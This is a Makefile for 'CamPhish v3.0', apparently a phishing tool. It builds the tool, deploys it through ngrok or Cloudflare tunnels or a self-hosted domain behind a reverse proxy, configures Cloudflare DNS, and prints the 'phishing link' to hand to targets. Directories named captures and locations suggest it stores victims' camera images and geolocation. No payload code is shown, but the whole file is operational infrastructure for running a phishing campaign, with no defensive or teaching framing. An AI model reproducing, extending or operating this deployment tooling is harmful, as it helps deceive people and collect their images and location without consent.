.PHONY: help build build-all up down restart logs status link clean inspect rebase sbom \
        up-local up-self-hosted up-coolify up-ngrok up-cloudflared \
        proxy-caddy proxy-traefik proxy-nginx \
        cf-dns cf-dns-delete

include .env
export

# =========================================================================
# Help
# =========================================================================
help:
	@echo "CamPhish v3.0 — Pack Buildpacks + Docker"
	@echo ""
	@echo "BUILD (pack CLI):"
	@echo "  make build          Build app OCI image with pack"
	@echo "  make build-all      Build app + dashboard images"
	@echo "  make inspect        Inspect built image"
	@echo "  make rebase         Rebase image on updated run image"
	@echo "  make sbom           Download SBOM"
	@echo ""
	@echo "DEPLOY:"
	@echo "  make up             Start (uses DEPLOY_MODE from .env)"
	@echo "  make up-local       Local Docker + tunnel"
	@echo "  make up-self-hosted VPS + reverse proxy + domain"
	@echo "  make up-coolify     Coolify-compatible deployment"
	@echo "  make down           Stop all services"
	@echo "  make restart        Restart all services"
	@echo ""
	@echo "TUNNEL (local mode):"
	@echo "  make up-ngrok       Local + ngrok tunnel"
	@echo "  make up-cloudflared Local + Cloudflare tunnel"
	@echo ""
	@echo "PROXY (self-hosted mode):"
	@echo "  make proxy-caddy    Use Caddy reverse proxy"
	@echo "  make proxy-traefik  Use Traefik reverse proxy"
	@echo "  make proxy-nginx    Use Nginx reverse proxy"
	@echo ""
	@echo "CLOUDFLARE DNS:"
	@echo "  make cf-dns         Create/update Cloudflare DNS records"
	@echo "  make cf-dns-delete  Delete Cloudflare DNS records"
	@echo ""
	@echo "OPERATIONS:"
	@echo "  make logs           Tail all logs"
	@echo "  make status         Show service status"
	@echo "  make link           Show phishing link"
	@echo "  make clean          Remove all data and volumes"
	@echo "  make shell          Open shell in app container"

# =========================================================================
# Pack Builds
# =========================================================================
build:
	bash pack/build.sh build

build-all:
	bash pack/build.sh all

inspect:
	bash pack/build.sh inspect

rebase:
	bash pack/build.sh rebase

sbom:
	bash pack/build.sh sbom

# =========================================================================
# Deploy
# =========================================================================
up:
	@case "$(DEPLOY_MODE)" in \
		local)       $(MAKE) up-local ;; \
		self-hosted) $(MAKE) up-self-hosted ;; \
		coolify)     $(MAKE) up-coolify ;; \
		*)           echo "Invalid DEPLOY_MODE: $(DEPLOY_MODE)"; exit 1 ;; \
	esac

up-local:
	@if [ "$(TUNNEL)" = "ngrok" ]; then $(MAKE) up-ngrok; else $(MAKE) up-cloudflared; fi

up-ngrok:
	docker compose --profile ngrok up -d
	@sleep 8
	@$(MAKE) link
	@echo "Dashboard: http://localhost:$(DASHBOARD_PORT)"

up-cloudflared:
	docker compose --profile cloudflared up -d
	@sleep 12
	@$(MAKE) link
	@echo "Dashboard: http://localhost:$(DASHBOARD_PORT)"

up-self-hosted:
	@if [ -z "$(DOMAIN)" ]; then echo "ERROR: DOMAIN must be set in .env"; exit 1; fi
	@if [ -n "$(CF_API_TOKEN)" ] && [ -n "$(CF_ZONE_ID)" ]; then \
		bash cloudflare/dns-setup.sh "$(CF_API_TOKEN)" "$(CF_ZONE_ID)" "$(SUBDOMAIN).$(DOMAIN)" "$(CF_ORANGE_CLOUD)"; \
	fi
	docker compose --profile self-hosted --profile proxy-$(PROXY) up -d
	@echo "Deployed at https://$(SUBDOMAIN).$(DOMAIN)"
	@echo "Dashboard: https://dashboard.$(SUBDOMAIN).$(DOMAIN)"

up-coolify:
	docker compose --profile coolify up -d
	@echo "Deployed for Coolify. Configure in Coolify dashboard."

down:
	docker compose --profile '*' down
	@if [ "$(AUTO_CLEANUP)" = "true" ]; then \
		rm -f data/logs/*.log data/locations/current_location.txt; \
	fi

restart:
	docker compose --profile '*' down
	@sleep 2
	@$(MAKE) up

# =========================================================================
# Proxy Selection
# =========================================================================
proxy-caddy:
	@echo "Switching proxy to Caddy..."
	@sed -i '' 's/^PROXY=.*/PROXY=caddy/' .env

proxy-traefik:
	@echo "Switching proxy to Traefik..."
	@sed -i '' 's/^PROXY=.*/PROXY=traefik/' .env

proxy-nginx:
	@echo "Switching proxy to Nginx..."
	@sed -i '' 's/^PROXY=.*/PROXY=nginx/' .env

# =========================================================================
# Cloudflare DNS
# =========================================================================
cf-dns:
	@if [ -z "$(CF_API_TOKEN)" ] || [ -z "$(CF_ZONE_ID)" ]; then \
		echo "ERROR: CF_API_TOKEN and CF_ZONE_ID must be set in .env"; exit 1; \
	fi
	bash cloudflare/dns-setup.sh "$(CF_API_TOKEN)" "$(CF_ZONE_ID)" "$(SUBDOMAIN).$(DOMAIN)" "$(CF_ORANGE_CLOUD)"

cf-dns-delete:
	@if [ -z "$(CF_API_TOKEN)" ] || [ -z "$(CF_ZONE_ID)" ]; then \
		echo "ERROR: CF_API_TOKEN and CF_ZONE_ID must be set in .env"; exit 1; \
	fi
	bash cloudflare/dns-delete.sh "$(CF_API_TOKEN)" "$(CF_ZONE_ID)" "$(SUBDOMAIN).$(DOMAIN)"

# =========================================================================
# Operations
# =========================================================================
logs:
	docker compose logs -f --tail=$(LOG_TAIL)

status:
	@docker compose ps
	@echo ""
	@echo "Dashboard: http://localhost:$(DASHBOARD_PORT)"

link:
	@if [ "$(TUNNEL)" = "ngrok" ]; then \
		curl -s http://localhost:4040/api/tunnels 2>/dev/null | jq -r '.tunnels[0].public_url // "not ready"'; \
	elif [ "$(TUNNEL)" = "cloudflared" ]; then \
		docker compose logs cloudflared 2>/dev/null | grep -o 'https://[-0-9a-z]*\.trycloudflare.com' | tail -1 || echo "not ready"; \
	else \
		echo "https://$(SUBDOMAIN).$(DOMAIN)"; \
	fi

clean:
	docker compose --profile '*' down -v
	rm -rf data/captures/* data/locations/* data/logs/*

shell:
	docker compose exec app bash
